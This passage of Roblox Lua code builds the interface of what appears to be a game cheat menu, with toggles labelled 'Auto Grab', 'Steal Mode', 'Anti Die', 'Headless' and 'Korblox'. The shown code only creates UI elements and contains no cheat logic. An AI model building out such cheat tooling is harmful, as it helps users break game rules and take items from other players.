G.Frame_43.Size = UDim2.new(0, 18, 0, 18)
G.Frame_43.ZIndex = 4
G.Frame_43.Parent = G.Frame_42

-- UICorner_48 (UICorner)
G.UICorner_48 = Instance.new("UICorner")
G.UICorner_48.CornerRadius = UDim.new(1, 0)
G.UICorner_48.Parent = G.Frame_43

-- TextButton_13 (TextButton)
G.TextButton_13 = Instance.new("TextButton")
G.TextButton_13.BackgroundTransparency = 1
G.TextButton_13.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_13.ZIndex = 5
G.TextButton_13.AutoButtonColor = false
G.TextButton_13.Text = ""
G.TextButton_13:SetAttribute("PrintedSoundWired", true)
G.TextButton_13.Parent = G.Frame_42

-- Frame_44 (Frame)
G.Frame_44 = Instance.new("Frame")
G.Frame_44.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_44.BorderSizePixel = 0
G.Frame_44.ClipsDescendants = true
G.Frame_44.LayoutOrder = 33
G.Frame_44.Size = UDim2.new(1, 0, 0, 40)
G.Frame_44.Parent = G.Page2

-- UICorner_49 (UICorner)
G.UICorner_49 = Instance.new("UICorner")
G.UICorner_49.CornerRadius = UDim.new(0, 14)
G.UICorner_49.Parent = G.Frame_44

-- UIStroke_25 (UIStroke)
G.UIStroke_25 = Instance.new("UIStroke")
G.UIStroke_25.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_25.Parent = G.Frame_44

-- TextLabel_26 (TextLabel)
G.TextLabel_26 = Instance.new("TextLabel")
G.TextLabel_26.BackgroundTransparency = 1
G.TextLabel_26.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_26.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_26.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_26.Text = "Anti Die"
G.TextLabel_26.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_26.TextSize = 14
G.TextLabel_26.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_26.Parent = G.Frame_44

-- Frame_45 (Frame)
G.Frame_45 = Instance.new("Frame")
G.Frame_45.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_45.BorderSizePixel = 0
G.Frame_45.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_45.Size = UDim2.new(0, 46, 0, 24)
G.Frame_45.ZIndex = 3
G.Frame_45.Parent = G.Frame_44

-- UICorner_50 (UICorner)
G.UICorner_50 = Instance.new("UICorner")
G.UICorner_50.CornerRadius = UDim.new(1, 0)
G.UICorner_50.Parent = G.Frame_45

-- Frame_46 (Frame)
G.Frame_46 = Instance.new("Frame")
G.Frame_46.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_46.BorderSizePixel = 0
G.Frame_46.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_46.Size = UDim2.new(0, 18, 0, 18)
G.Frame_46.ZIndex = 4
G.Frame_46.Parent = G.Frame_45

-- UICorner_51 (UICorner)
G.UICorner_51 = Instance.new("UICorner")
G.UICorner_51.CornerRadius = UDim.new(1, 0)
G.UICorner_51.Parent = G.Frame_46

-- TextButton_14 (TextButton)
G.TextButton_14 = Instance.new("TextButton")
G.TextButton_14.BackgroundTransparency = 1
G.TextButton_14.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_14.ZIndex = 5
G.TextButton_14.AutoButtonColor = false
G.TextButton_14.Text = ""
G.TextButton_14:SetAttribute("PrintedSoundWired", true)
G.TextButton_14.Parent = G.Frame_45

-- Frame_47 (Frame)
G.Frame_47 = Instance.new("Frame")
G.Frame_47.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_47.BorderSizePixel = 0
G.Frame_47.ClipsDescendants = true
G.Frame_47.LayoutOrder = 34
G.Frame_47.Size = UDim2.new(1, 0, 0, 40)
G.Frame_47.Parent = G.Page2

-- UICorner_52 (UICorner)
G.UICorner_52 = Instance.new("UICorner")
G.UICorner_52.CornerRadius = UDim.new(0, 14)
G.UICorner_52.Parent = G.Frame_47

-- UIStroke_26 (UIStroke)
G.UIStroke_26 = Instance.new("UIStroke")
G.UIStroke_26.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_26.Parent = G.Frame_47

-- TextLabel_27 (TextLabel)
G.TextLabel_27 = Instance.new("TextLabel")
G.TextLabel_27.BackgroundTransparency = 1
G.TextLabel_27.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_27.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_27.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_27.Text = "Safe Mode"
G.TextLabel_27.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_27.TextSize = 14
G.TextLabel_27.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_27.Parent = G.Frame_47

-- Frame_48 (Frame)
G.Frame_48 = Instance.new("Frame")
G.Frame_48.BackgroundColor3 = Color3.fromRGB(28, 90, 180)
G.Frame_48.BorderSizePixel = 0
G.Frame_48.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_48.Size = UDim2.new(0, 46, 0, 24)
G.Frame_48.ZIndex = 3
G.Frame_48.Parent = G.Frame_47

-- UICorner_53 (UICorner)
G.UICorner_53 = Instance.new("UICorner")
G.UICorner_53.CornerRadius = UDim.new(1, 0)
G.UICorner_53.Parent = G.Frame_48

-- Frame_49 (Frame)
G.Frame_49 = Instance.new("Frame")
G.Frame_49.BackgroundColor3 = Color3.new(0.53411763906478882, 0.77568626403808594, 1)
G.Frame_49.BorderSizePixel = 0
G.Frame_49.Position = UDim2.new(1, -21, 0.5, -9)
G.Frame_49.Size = UDim2.new(0, 18, 0, 18)
G.Frame_49.ZIndex = 4
G.Frame_49.Parent = G.Frame_48

-- UICorner_54 (UICorner)
G.UICorner_54 = Instance.new("UICorner")
G.UICorner_54.CornerRadius = UDim.new(1, 0)
G.UICorner_54.Parent = G.Frame_49

-- TextButton_15 (TextButton)
G.TextButton_15 = Instance.new("TextButton")
G.TextButton_15.BackgroundTransparency = 1
G.TextButton_15.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_15.ZIndex = 5
G.TextButton_15.AutoButtonColor = false
G.TextButton_15.Text = ""
G.TextButton_15:SetAttribute("PrintedSoundWired", true)
G.TextButton_15.Parent = G.Frame_48

-- AccentGrad_2 (UIGradient)
G.AccentGrad_2 = Instance.new("UIGradient")
G.AccentGrad_2.Name = "AccentGrad"
G.AccentGrad_2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 100, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 180, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 120, 255))})
G.AccentGrad_2.Rotation = 28
G.AccentGrad_2.Parent = G.Frame_48

-- Frame_50 (Frame)
G.Frame_50 = Instance.new("Frame")
G.Frame_50.BackgroundTransparency = 1
G.Frame_50.BorderSizePixel = 0
G.Frame_50.LayoutOrder = 35
G.Frame_50.Size = UDim2.new(1, 0, 0, 38)
G.Frame_50.Parent = G.Page2

-- TextLabel_28 (TextLabel)
G.TextLabel_28 = Instance.new("TextLabel")
G.TextLabel_28.BackgroundTransparency = 1
G.TextLabel_28.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_28.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_28.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_28.Text = "STEAL"
G.TextLabel_28.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_28.TextSize = 15
G.TextLabel_28.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_28.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_28.Parent = G.Frame_50

-- Frame_51 (Frame)
G.Frame_51 = Instance.new("Frame")
G.Frame_51.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_51.BackgroundTransparency = 0.34999999403953552
G.Frame_51.BorderSizePixel = 0
G.Frame_51.Position = UDim2.new(0, 8, 1, -4)
G.Frame_51.Size = UDim2.new(1, -16, 0, 2)
G.Frame_51.Parent = G.Frame_50

-- Frame_52 (Frame)
G.Frame_52 = Instance.new("Frame")
G.Frame_52.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_52.BorderSizePixel = 0
G.Frame_52.ClipsDescendants = true
G.Frame_52.LayoutOrder = 36
G.Frame_52.Size = UDim2.new(1, 0, 0, 40)
G.Frame_52.Parent = G.Page2

-- UICorner_55 (UICorner)
G.UICorner_55 = Instance.new("UICorner")
G.UICorner_55.CornerRadius = UDim.new(0, 14)
G.UICorner_55.Parent = G.Frame_52

-- UIStroke_27 (UIStroke)
G.UIStroke_27 = Instance.new("UIStroke")
G.UIStroke_27.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_27.Parent = G.Frame_52

-- TextLabel_29 (TextLabel)
G.TextLabel_29 = Instance.new("TextLabel")
G.TextLabel_29.BackgroundTransparency = 1
G.TextLabel_29.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_29.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_29.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_29.Text = "Auto Grab"
G.TextLabel_29.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_29.TextSize = 14
G.TextLabel_29.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_29.Parent = G.Frame_52

-- Frame_53 (Frame)
G.Frame_53 = Instance.new("Frame")
G.Frame_53.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_53.BorderSizePixel = 0
G.Frame_53.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_53.Size = UDim2.new(0, 46, 0, 24)
G.Frame_53.ZIndex = 3
G.Frame_53.Parent = G.Frame_52

-- UICorner_56 (UICorner)
G.UICorner_56 = Instance.new("UICorner")
G.UICorner_56.CornerRadius = UDim.new(1, 0)
G.UICorner_56.Parent = G.Frame_53

-- Frame_54 (Frame)
G.Frame_54 = Instance.new("Frame")
G.Frame_54.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_54.BorderSizePixel = 0
G.Frame_54.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_54.Size = UDim2.new(0, 18, 0, 18)
G.Frame_54.ZIndex = 4
G.Frame_54.Parent = G.Frame_53

-- UICorner_57 (UICorner)
G.UICorner_57 = Instance.new("UICorner")
G.UICorner_57.CornerRadius = UDim.new(1, 0)
G.UICorner_57.Parent = G.Frame_54

-- TextButton_16 (TextButton)
G.TextButton_16 = Instance.new("TextButton")
G.TextButton_16.BackgroundTransparency = 1
G.TextButton_16.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_16.ZIndex = 5
G.TextButton_16.AutoButtonColor = false
G.TextButton_16.Text = ""
G.TextButton_16:SetAttribute("PrintedSoundWired", true)
G.TextButton_16.Parent = G.Frame_53

-- Frame_55 (Frame)
G.Frame_55 = Instance.new("Frame")
G.Frame_55.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_55.BorderSizePixel = 0
G.Frame_55.ClipsDescendants = true
G.Frame_55.LayoutOrder = 37
G.Frame_55.Size = UDim2.new(1, 0, 0, 40)
G.Frame_55.Parent = G.Page2

-- UICorner_58 (UICorner)
G.UICorner_58 = Instance.new("UICorner")
G.UICorner_58.CornerRadius = UDim.new(0, 14)
G.UICorner_58.Parent = G.Frame_55

-- UIStroke_28 (UIStroke)
G.UIStroke_28 = Instance.new("UIStroke")
G.UIStroke_28.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_28.Parent = G.Frame_55

-- TextLabel_30 (TextLabel)
G.TextLabel_30 = Instance.new("TextLabel")
G.TextLabel_30.BackgroundTransparency = 1
G.TextLabel_30.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_30.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_30.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_30.Text = "Steal Mode"
G.TextLabel_30.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_30.TextSize = 14
G.TextLabel_30.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_30.Parent = G.Frame_55

-- DropChip_2 (TextButton)
G.DropChip_2 = Instance.new("TextButton")
G.DropChip_2.Name = "DropChip"
G.DropChip_2.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
G.DropChip_2.BorderSizePixel = 0
G.DropChip_2.Position = UDim2.new(1, -100, 0, 7)
G.DropChip_2.Size = UDim2.new(0, 90, 0, 26)
G.DropChip_2.ZIndex = 12
G.DropChip_2.AutoButtonColor = false
G.DropChip_2.Text = ""
G.DropChip_2:SetAttribute("PrintedSoundWired", true)
G.DropChip_2.Parent = G.Frame_55

-- UICorner_59 (UICorner)
G.UICorner_59 = Instance.new("UICorner")
G.UICorner_59.Parent = G.DropChip_2

-- UIStroke_29 (UIStroke)
G.UIStroke_29 = Instance.new("UIStroke")
G.UIStroke_29.Color = Color3.fromRGB(55, 60, 72)
G.UIStroke_29.Transparency = 0.40000000596046448
G.UIStroke_29.Parent = G.DropChip_2

-- TextLabel_31 (TextLabel)
G.TextLabel_31 = Instance.new("TextLabel")
G.TextLabel_31.BackgroundTransparency = 1
G.TextLabel_31.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_31.Size = UDim2.new(1, -22, 1, 0)
G.TextLabel_31.ZIndex = 13
G.TextLabel_31.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_31.Text = "Semi"
G.TextLabel_31.TextColor3 = Color3.fromRGB(200, 204, 216)
G.TextLabel_31.TextSize = 12
G.TextLabel_31.TextTruncate = Enum.TextTruncate.AtEnd
G.TextLabel_31.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_31.Parent = G.DropChip_2

-- TextLabel_32 (TextLabel)
G.TextLabel_32 = Instance.new("TextLabel")
G.TextLabel_32.BackgroundTransparency = 1
G.TextLabel_32.Position = UDim2.new(1, -18, 0, 0)
G.TextLabel_32.Size = UDim2.new(0, 18, 1, 0)
G.TextLabel_32.ZIndex = 13
G.TextLabel_32.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_32.Text = "v"
G.TextLabel_32.TextColor3 = Color3.fromRGB(150, 155, 168)
G.TextLabel_32.TextSize = 11
G.TextLabel_32.Parent = G.DropChip_2

-- Frame_56 (Frame)
G.Frame_56 = Instance.new("Frame")
G.Frame_56.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_56.BorderSizePixel = 0
G.Frame_56.ClipsDescendants = true
G.Frame_56.LayoutOrder = 38
G.Frame_56.Size = UDim2.new(1, 0, 0, 40)
G.Frame_56.Parent = G.Page2

-- UICorner_60 (UICorner)
G.UICorner_60 = Instance.new("UICorner")
G.UICorner_60.CornerRadius = UDim.new(0, 14)
G.UICorner_60.Parent = G.Frame_56

-- UIStroke_30 (UIStroke)
G.UIStroke_30 = Instance.new("UIStroke")
G.UIStroke_30.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_30.Parent = G.Frame_56

-- TextLabel_33 (TextLabel)
G.TextLabel_33 = Instance.new("TextLabel")
G.TextLabel_33.BackgroundTransparency = 1
G.TextLabel_33.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_33.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_33.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_33.Text = "Grab Radius"
G.TextLabel_33.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_33.TextSize = 14
G.TextLabel_33.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_33.Parent = G.Frame_56

-- TextBox_7 (TextBox)
G.TextBox_7 = Instance.new("TextBox")
G.TextBox_7.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
G.TextBox_7.BorderSizePixel = 0
G.TextBox_7.Position = UDim2.new(1, -64, 0.5, -13)
G.TextBox_7.Size = UDim2.new(0, 56, 0, 26)
G.TextBox_7.ZIndex = 6
G.TextBox_7.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextBox_7.Text = "60"
G.TextBox_7.TextColor3 = Color3.fromRGB(230, 230, 240)
G.TextBox_7.TextSize = 12
G.TextBox_7.ClearTextOnFocus = false
G.TextBox_7.Parent = G.Frame_56

-- UICorner_61 (UICorner)
G.UICorner_61 = Instance.new("UICorner")
G.UICorner_61.CornerRadius = UDim.new(0, 7)
G.UICorner_61.Parent = G.TextBox_7

-- Page3 (ScrollingFrame)
G.Page3 = Instance.new("ScrollingFrame")
G.Page3.Name = "Page3"
G.Page3.BackgroundTransparency = 1
G.Page3.BorderSizePixel = 0
G.Page3.Size = UDim2.new(1, 0, 1, 0)
G.Page3.Visible = false
G.Page3.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.Page3.CanvasSize = UDim2.new(0, 0, 0, 0)
G.Page3.ScrollBarImageTransparency = 1
G.Page3.ScrollBarThickness = 0
G.Page3.Parent = G.Pages

-- UIListLayout_3 (UIListLayout)
G.UIListLayout_3 = Instance.new("UIListLayout")
G.UIListLayout_3.Padding = UDim.new(0, 3)
G.UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_3.Parent = G.Page3

-- UIPadding_3 (UIPadding)
G.UIPadding_3 = Instance.new("UIPadding")
G.UIPadding_3.PaddingBottom = UDim.new(0, 10)
G.UIPadding_3.PaddingLeft = UDim.new(0, 7)
G.UIPadding_3.PaddingRight = UDim.new(0, 7)
G.UIPadding_3.PaddingTop = UDim.new(0, 7)
G.UIPadding_3.Parent = G.Page3

-- Frame_57 (Frame)
G.Frame_57 = Instance.new("Frame")
G.Frame_57.BackgroundTransparency = 1
G.Frame_57.BorderSizePixel = 0
G.Frame_57.LayoutOrder = 8
G.Frame_57.Size = UDim2.new(1, 0, 0, 38)
G.Frame_57.Parent = G.Page3

-- TextLabel_34 (TextLabel)
G.TextLabel_34 = Instance.new("TextLabel")
G.TextLabel_34.BackgroundTransparency = 1
G.TextLabel_34.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_34.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_34.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_34.Text = "VISUAL"
G.TextLabel_34.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_34.TextSize = 15
G.TextLabel_34.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_34.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_34.Parent = G.Frame_57

-- Frame_58 (Frame)
G.Frame_58 = Instance.new("Frame")
G.Frame_58.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_58.BackgroundTransparency = 0.34999999403953552
G.Frame_58.BorderSizePixel = 0
G.Frame_58.Position = UDim2.new(0, 8, 1, -4)
G.Frame_58.Size = UDim2.new(1, -16, 0, 2)
G.Frame_58.Parent = G.Frame_57

-- Frame_59 (Frame)
G.Frame_59 = Instance.new("Frame")
G.Frame_59.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_59.BorderSizePixel = 0
G.Frame_59.ClipsDescendants = true
G.Frame_59.LayoutOrder = 9
G.Frame_59.Size = UDim2.new(1, 0, 0, 40)
G.Frame_59.Parent = G.Page3

-- UICorner_62 (UICorner)
G.UICorner_62 = Instance.new("UICorner")
G.UICorner_62.CornerRadius = UDim.new(0, 14)
G.UICorner_62.Parent = G.Frame_59

-- UIStroke_31 (UIStroke)
G.UIStroke_31 = Instance.new("UIStroke")
G.UIStroke_31.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_31.Parent = G.Frame_59

-- TextLabel_35 (TextLabel)
G.TextLabel_35 = Instance.new("TextLabel")
G.TextLabel_35.BackgroundTransparency = 1
G.TextLabel_35.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_35.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_35.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_35.Text = "Headless"
G.TextLabel_35.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_35.TextSize = 14
G.TextLabel_35.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_35.Parent = G.Frame_59

-- Frame_60 (Frame)
G.Frame_60 = Instance.new("Frame")
G.Frame_60.BackgroundColor3 = Color3.fromRGB(28, 90, 180)
G.Frame_60.BorderSizePixel = 0
G.Frame_60.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_60.Size = UDim2.new(0, 46, 0, 24)
G.Frame_60.ZIndex = 3
G.Frame_60.Parent = G.Frame_59

-- UICorner_63 (UICorner)
G.UICorner_63 = Instance.new("UICorner")
G.UICorner_63.CornerRadius = UDim.new(1, 0)
G.UICorner_63.Parent = G.Frame_60

-- Frame_61 (Frame)
G.Frame_61 = Instance.new("Frame")
G.Frame_61.BackgroundColor3 = Color3.new(0.53411763906478882, 0.77568626403808594, 1)
G.Frame_61.BorderSizePixel = 0
G.Frame_61.Position = UDim2.new(1, -21, 0.5, -9)
G.Frame_61.Size = UDim2.new(0, 18, 0, 18)
G.Frame_61.ZIndex = 4
G.Frame_61.Parent = G.Frame_60

-- UICorner_64 (UICorner)
G.UICorner_64 = Instance.new("UICorner")
G.UICorner_64.CornerRadius = UDim.new(1, 0)
G.UICorner_64.Parent = G.Frame_61

-- TextButton_17 (TextButton)
G.TextButton_17 = Instance.new("TextButton")
G.TextButton_17.BackgroundTransparency = 1
G.TextButton_17.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_17.ZIndex = 5
G.TextButton_17.AutoButtonColor = false
G.TextButton_17.Text = ""
G.TextButton_17:SetAttribute("PrintedSoundWired", true)
G.TextButton_17.Parent = G.Frame_60

-- AccentGrad_3 (UIGradient)
G.AccentGrad_3 = Instance.new("UIGradient")
G.AccentGrad_3.Name = "AccentGrad"
G.AccentGrad_3.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 100, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 180, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 120, 255))})
G.AccentGrad_3.Rotation = 28
G.AccentGrad_3.Parent = G.Frame_60

-- Frame_62 (Frame)
G.Frame_62 = Instance.new("Frame")
G.Frame_62.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_62.BorderSizePixel = 0
G.Frame_62.ClipsDescendants = true
G.Frame_62.LayoutOrder = 10
G.Frame_62.Size = UDim2.new(1, 0, 0, 40)
G.Frame_62.Parent = G.Page3

-- UICorner_65 (UICorner)
G.UICorner_65 = Instance.new("UICorner")
G.UICorner_65.CornerRadius = UDim.new(0, 14)
G.UICorner_65.Parent = G.Frame_62

-- UIStroke_32 (UIStroke)
G.UIStroke_32 = Instance.new("UIStroke")
G.UIStroke_32.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_32.Parent = G.Frame_62

-- TextLabel_36 (TextLabel)
G.TextLabel_36 = Instance.new("TextLabel")
G.TextLabel_36.BackgroundTransparency = 1
G.TextLabel_36.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_36.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_36.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_36.Text = "Korblox"
G.TextLabel_36.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_36.TextSize = 14
G.TextLabel_36.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_36.Parent = G.Frame_62

-- Frame_63 (Frame)
G.Frame_63 = Instance.new("Frame")
G.Frame_63.BackgroundColor3 = Color3.fromRGB(28, 90, 180)
G.Frame_63.BorderSizePixel = 0
G.Frame_63.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_63.Size = UDim2.new(0, 46, 0, 24)
G.Frame_63.ZIndex = 3
G.Frame_63.Parent = G.Frame_62

-- UICorner_66 (UICorner)
G.UICorner_66 = Instance.new("UICorner")
G.UICorner_66.CornerRadius = UDim.new(1, 0)
G.UICorner_66.Parent = G.Frame_63

-- Frame_64 (Frame)
G.Frame_64 = Instance.new("Frame")
G.Frame_64.BackgroundColor3 = Color3.new(0.53411763906478882, 0.77568626403808594, 1)
G.Frame_64.BorderSizePixel = 0
G.Frame_64.Position = UDim2.new(1, -21, 0.5, -9)
G.Frame_64.Size = UDim2.new(0, 18, 0, 18)
G.Frame_64.ZIndex = 4
G.Frame_64.Parent = G.Frame_63

-- UICorner_67 (UICorner)
G.UICorner_67 = Instance.new("UICorner")
G.UICorner_67.CornerRadius = UDim.new(1, 0)
G.UICorner_67.Parent = G.Frame_64

-- TextButton_18 (TextButton)
G.TextButton_18 = Instance.new("TextButton")
G.TextButton_18.BackgroundTransparency = 1
G.TextButton_18.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_18.ZIndex = 5
G.TextButton_18.AutoButtonColor = false
G.TextButton_18.Text = ""
G.TextButton_18:SetAttribute("PrintedSoundWired", true)
G.TextButton_18.Parent = G.Frame_63

-- AccentGrad_4 (UIGradient)
G.AccentGrad_4 = Instance.new("UIGradient")
G.AccentGrad_4.Name = "AccentGrad"
G.AccentGrad_4.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 100, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 180, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 120, 255))})
G.AccentGrad_4.Rotation = 28
G.AccentGrad_4.Parent = G.Frame_63

-- Frame_65 (Frame)
G.Frame_65 = Instance.new("Frame")
G.Frame_65.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_65.BorderSizePixel = 0
G.Frame_65.ClipsDescendants = true
G.Frame_65.LayoutOrder = 11
G.Frame_65.Size = UDim2.new(1, 0, 0, 40)
G.Frame_65.Parent = G.Page3

-- UICorner_68 (UICorner)
G.UICorner_68 = Instance.new("UICorner")
G.UICorner_68.CornerRadius = UDim.new(0, 14)
G.UICorner_68.Parent = G.Frame_65

-- UIStroke_33 (UIStroke)
G.UIStroke_33 = Instance.new("UIStroke")
G.UIStroke_33.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_33.Parent = G.Frame_65

-- TextLabel_37 (TextLabel)
G.TextLabel_37 = Instance.new("TextLabel")
G.TextLabel_37.BackgroundTransparency = 1
G.TextLabel_37.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_37.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_37.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_37.Text = "Animation Pack"
G.TextLabel_37.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_37.TextSize = 14
G.TextLabel_37.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_37.Parent = G.Frame_65

-- Frame_66 (Frame)
G.Frame_66 = Instance.new("Frame")
G.Frame_66.BackgroundColor3 = Color3.fromRGB(28, 90, 180)
G.Frame_66.BorderSizePixel = 0
G.Frame_66.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_66.Size = UDim2.new(0, 46, 0, 24)
G.Frame_66.ZIndex = 3
G.Frame_66.Parent = G.Frame_65

-- UICorner_69 (UICorner)
G.UICorner_69 = Instance.new("UICorner")
G.UICorner_69.CornerRadius = UDim.new(1, 0)
G.UICorner_69.Parent = G.Frame_66

-- Frame_67 (Frame)
G.Frame_67 = Instance.new("Frame")
G.Frame_67.BackgroundColor3 = Color3.new(0.53411763906478882, 0.77568626403808594, 1)
G.Frame_67.BorderSizePixel = 0
G.Frame_67.Position = UDim2.new(1, -21, 0.5, -9)
G.Frame_67.Size = UDim2.new(0, 18, 0, 18)
G.Frame_67.ZIndex = 4
G.Frame_67.Parent = G.Frame_66

-- UICorner_70 (UICorner)
G.UICorner_70 = Instance.new("UICorner")
G.UICorner_70.CornerRadius = UDim.new(1, 0)
G.UICorner_70.Parent = G.Frame_67

-- TextButton_19 (TextButton)
G.TextButton_19 = Instance.new("TextButton")
G.TextButton_19.BackgroundTransparency = 1
G.TextButton_19.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_19.ZIndex = 5
G.TextButton_19.AutoButtonColor = false
G.TextButton_19.Text = ""
G.TextButton_19:SetAttribute("PrintedSoundWired", true)
G.TextButton_19.Parent = G.Frame_66

-- AccentGrad_5 (UIGradient)
G.AccentGrad_5 = Instance.new("UIGradient")
G.AccentGrad_5.Name = "AccentGrad"
G.AccentGrad_5.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 100, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 180, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 120, 255))})
G.AccentGrad_5.Rotation = 28
G.AccentGrad_5.Parent = G.Frame_66

